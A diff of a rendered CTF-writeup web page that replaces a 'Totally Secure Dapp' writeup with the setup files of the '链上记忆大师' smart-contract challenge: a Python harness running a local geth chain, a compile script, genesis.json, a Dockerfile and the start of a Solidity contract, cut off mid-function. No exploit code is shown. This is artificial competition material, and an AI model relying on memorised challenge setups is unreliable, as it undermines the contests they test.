@@ -6,20 +6,20 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="2022 | UACTF | Web">
+        <meta name="description" content="2022 | 中国科学技术大学第九届信息安全大赛 | General">
       
       
         <meta name="author" content="YanhuiJessica">
       
       
-        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/totally_secure_dapp/">
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/memory_master_on_the_chain/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.3.3">
     
     
       
-        <title>Blockchain - Totally Secure Dapp - Chictf-Writeups</title>
+        <title>Blockchain - 链上记忆大师 - Chictf-Writeups</title>
       
     
     
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Blockchain - Totally Secure Dapp
+              Blockchain - 链上记忆大师
             
           </span>
         </div>
@@ -2056,68 +2056,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Totally Secure Dapp
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../totally_secure_dapp/" class="md-nav__link">
         Totally Secure Dapp
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    题目
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    解题思路
-  </a>
-  
-    <nav class="md-nav" aria-label="解题思路">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#flag" class="md-nav__link">
-    Flag
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -2216,11 +2159,162 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../memory_master_on_the_chain/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          链上记忆大师
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         链上记忆大师
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    题目
+  </a>
+  
+    <nav class="md-nav" aria-label="题目">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    记忆练习
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    牛刀小试
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    终极挑战
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    解题思路
+  </a>
+  
+    <nav class="md-nav" aria-label="解题思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    记忆练习
+  </a>
+  
+    <nav class="md-nav" aria-label="记忆练习">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    牛刀小试
+  </a>
+  
+    <nav class="md-nav" aria-label="牛刀小试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    终极挑战
+  </a>
+  
+    <nav class="md-nav" aria-label="终极挑战">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#flag_2" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -2572,10 +2666,37 @@
     题目
   </a>
   
+    <nav class="md-nav" aria-label="题目">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    记忆练习
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    牛刀小试
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    终极挑战
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
+  <a href="#_5" class="md-nav__link">
     解题思路
   </a>
   
@@ -2583,9 +2704,76 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    记忆练习
+  </a>
+  
+    <nav class="md-nav" aria-label="记忆练习">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#flag" class="md-nav__link">
     Flag
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    牛刀小试
+  </a>
+  
+    <nav class="md-nav" aria-label="牛刀小试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    终极挑战
+  </a>
+  
+    <nav class="md-nav" aria-label="终极挑战">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#flag_2" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -2608,20 +2796,20 @@
   
   <div style="color: gray;">
     <small>
-      2022 | UACTF | Web
+      2022 | 中国科学技术大学第九届信息安全大赛 | General
     </small>
   </div>
   
 
   
                 
-  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/totally_secure_dapp.md" title="编辑此页" class="md-content__button md-icon">
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/memory_master_on_the_chain.md" title="编辑此页" class="md-content__button md-icon">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
   </a>
 
 
 
-  <h1>Totally Secure Dapp</h1>
+  <h1>链上记忆大师</h1>
 
 <div class="blogging-tags-grid">
 
@@ -2648,183 +2836,317 @@
     }
 </style>
 <h2 id="_1">题目<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<p>It's on the blockchain, and there's no way anything on the blockchain could ever have any vulnerabilities.</p>
-<p>Note, because the contract is on Ropsten, some transactions might fail. If that happens, just keep retrying.</p>
-<p>Get test ether from <a href="https://faucet.metamask.io/">https://faucet.metamask.io/</a></p>
-<p><a href="https://totally-secure-dapp.vercel.app/">https://totally-secure-dapp.vercel.app/</a></p>
-<p><a href="../static/totally-secure-dapp.zip"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 20h14v-2H5m14-9h-4V3H9v6H5l7 7 7-7Z"/></svg></span> <code>totally-secure-dapp.zip</code></a></p>
-<h2 id="_2">解题思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<ul>
-<li><a href="https://totally-secure-dapp.vercel.app/">https://totally-secure-dapp.vercel.app/</a> 主要提供了 <code>New Post</code> 和展示 Post 的功能，Post 记录上链</li>
-<li>
-<p>提供了两份合约代码，Post 相关操作函数位于 <code>TotallySecureDapp.sol</code>，当调用者为 <code>owner</code> 且合约账户的余额大于 <code>0.005</code> 以太时可以触发 <code>FlagCaptured</code> 事件</p>
-<div class="highlight"><pre><span></span><code><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_owner</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Caller is not the owner&#39;</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="nx">_</span><span class="p">;</span><span class="w"></span>
+<p>听说你在区块链上部署的智能合约有过目不忘的能力。</p>
+<details class="note">
+<summary>main.py</summary>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
+<span class="kn">from</span> <span class="nn">web3.middleware</span> <span class="kn">import</span> <span class="n">geth_poa_middleware</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+
+<span class="n">challenge_id</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;The challenge you want to play (1 or 2 or 3): &#39;</span><span class="p">))</span>
+<span class="k">assert</span> <span class="n">challenge_id</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">challenge_id</span> <span class="o">==</span> <span class="mi">2</span> <span class="ow">or</span> <span class="n">challenge_id</span> <span class="o">==</span> <span class="mi">3</span>
+
+<span class="n">player_bytecode</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Player bytecode: &#39;</span><span class="p">))</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Launching geth...&#39;</span><span class="p">)</span>
+<span class="n">shutil</span><span class="o">.</span><span class="n">copytree</span><span class="p">(</span><span class="s1">&#39;/data&#39;</span><span class="p">,</span> <span class="s1">&#39;/dev/shm/geth&#39;</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;geth --datadir /dev/shm/geth --nodiscover --mine --unlock 0x2022af4DCbb9dA7F41cBD3dD8CdB4134D4e6DDe6 --password password.txt --verbosity 0 --datadir.minfreedisk 0 &amp;&#39;</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">IPCProvider</span><span class="p">(</span><span class="s1">&#39;/dev/shm/geth/geth.ipc&#39;</span><span class="p">))</span>
+<span class="n">w3</span><span class="o">.</span><span class="n">middleware_onion</span><span class="o">.</span><span class="n">inject</span><span class="p">(</span><span class="n">geth_poa_middleware</span><span class="p">,</span> <span class="n">layer</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">default_account</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">accounts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">w3</span><span class="o">.</span><span class="n">geth</span><span class="o">.</span><span class="n">personal</span><span class="o">.</span><span class="n">unlock_account</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">default_account</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;password.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Deploying challenge contract...&#39;</span><span class="p">)</span>
+<span class="n">bytecode</span><span class="p">,</span> <span class="n">abi</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;contract</span><span class="si">{</span><span class="n">challenge_id</span><span class="si">}</span><span class="s1">.json&#39;</span><span class="p">))</span>
+<span class="n">Challenge</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">abi</span><span class="o">=</span><span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span><span class="o">=</span><span class="n">bytecode</span><span class="p">)</span>
+<span class="n">tx_hash</span> <span class="o">=</span> <span class="n">Challenge</span><span class="o">.</span><span class="n">constructor</span><span class="p">()</span><span class="o">.</span><span class="n">transact</span><span class="p">()</span>
+<span class="n">tx_receipt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">wait_for_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Challenge contract address:&#39;</span><span class="p">,</span> <span class="n">tx_receipt</span><span class="o">.</span><span class="n">contractAddress</span><span class="p">)</span>
+<span class="n">challenge</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">tx_receipt</span><span class="o">.</span><span class="n">contractAddress</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">abi</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Deploying player contract...&#39;</span><span class="p">)</span>
+<span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_transaction</span><span class="p">({</span><span class="s1">&#39;to&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">player_bytecode</span><span class="p">})</span>
+<span class="n">tx_receipt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">wait_for_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Player contract address:&#39;</span><span class="p">,</span> <span class="n">tx_receipt</span><span class="o">.</span><span class="n">contractAddress</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Testing </span><span class="si">{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s1">/10...&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">challenge_id</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;n = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">challenge</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">tx_receipt</span><span class="o">.</span><span class="n">contractAddress</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span><span class="o">.</span><span class="n">call</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Test passed!&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Test failed!&#39;</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;flag</span><span class="si">{</span><span class="n">challenge_id</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</code></pre></div>
+</details>
+<details class="note">
+<summary>compile.py</summary>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">solcx</span> <span class="kn">import</span> <span class="n">compile_source</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="n">compiled_sol</span> <span class="o">=</span> <span class="n">compile_source</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;challenge</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">.sol&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">output_values</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">,</span> <span class="s1">&#39;bin&#39;</span><span class="p">])</span>
+    <span class="n">contract_interface</span> <span class="o">=</span> <span class="n">compiled_sol</span><span class="p">[</span><span class="s1">&#39;&lt;stdin&gt;:Challenge&#39;</span><span class="p">]</span>
+    <span class="n">bytecode</span> <span class="o">=</span> <span class="n">contract_interface</span><span class="p">[</span><span class="s1">&#39;bin&#39;</span><span class="p">]</span>
+    <span class="n">abi</span> <span class="o">=</span> <span class="n">contract_interface</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">]</span>
+    <span class="n">json</span><span class="o">.</span><span class="n">dump</span><span class="p">((</span><span class="n">bytecode</span><span class="p">,</span> <span class="n">abi</span><span class="p">),</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;contract</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">.json&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">))</span>
+</code></pre></div>
+</details>
+<details class="note">
+<summary>genesis.json</summary>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;config&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2022</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;homesteadBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;eip150Block&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;eip155Block&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;eip158Block&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;byzantiumBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;constantinopleBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;petersburgBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;istanbulBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;muirGlacierBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;berlinBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;londonBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;arrowGlacierBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;grayGlacierBlock&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;clique&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="nt">&quot;period&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">            </span><span class="nt">&quot;epoch&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;alloc&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">&quot;0x2022af4DCbb9dA7F41cBD3dD8CdB4134D4e6DDe6&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;balance&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x56bc75e2d63100000&quot;</span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">},</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;coinbase&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x0000000000000000000000000000000000000000&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;difficulty&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x1&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;gasLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x1c9c380&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;extraData&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x00000000000000000000000000000000000000000000000000000000000000002022af4dcbb9da7f41cbd3dd8cdb4134d4e6dde60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;nonce&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x0000000000000042&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;mixhash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;parentHash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x00&quot;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<details class="note">
+<summary>Dockerfile</summary>
+<div class="highlight"><pre><span></span><code><span class="k">FROM</span><span class="w"> </span><span class="s">ubuntu:22.04</span>
+<span class="k">RUN</span><span class="w"> </span>apt update <span class="o">&amp;&amp;</span> apt install -y software-properties-common <span class="o">&amp;&amp;</span> add-apt-repository -y ppa:ethereum/ethereum <span class="o">&amp;&amp;</span> apt update <span class="o">&amp;&amp;</span> apt install -y ethereum python3-pip
+<span class="k">RUN</span><span class="w"> </span>python3 -m pip install web3 py-solc-x
+<span class="k">RUN</span><span class="w"> </span>python3 -c <span class="s2">&quot;from solcx import install_solc; install_solc(version=&#39;latest&#39;)&quot;</span>
+<span class="k">COPY</span><span class="w"> </span>genesis.json privatekey.txt password.txt main.py challenge1.sol challenge2.sol challenge3.sol compile.py /
+<span class="k">RUN</span><span class="w"> </span>geth init --datadir data genesis.json
+<span class="k">RUN</span><span class="w"> </span>geth --datadir data account import --password password.txt privatekey.txt
+<span class="k">RUN</span><span class="w"> </span>python3 compile.py
+<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;/usr/bin/python3&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-u&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/main.py&quot;</span><span class="p">]</span>
+</code></pre></div>
+</details>
+<h3 id="_2">记忆练习<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">=</span><span class="mf">0.8.17</span><span class="p">;</span><span class="w"></span>
+
+<span class="kr">interface</span><span class="w"> </span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">memorize</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">recall</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">);</span><span class="w"></span>
 <span class="p">}</span><span class="w"></span>
 
-<span class="kd">function</span><span class="w"> </span><span class="nx">captureFlag</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0.005</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Balance too low&#39;</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="nx">_flagCaptured</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">FlagCaptured</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span><span class="w"></span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">test</span><span class="p">(</span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="nx">m</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
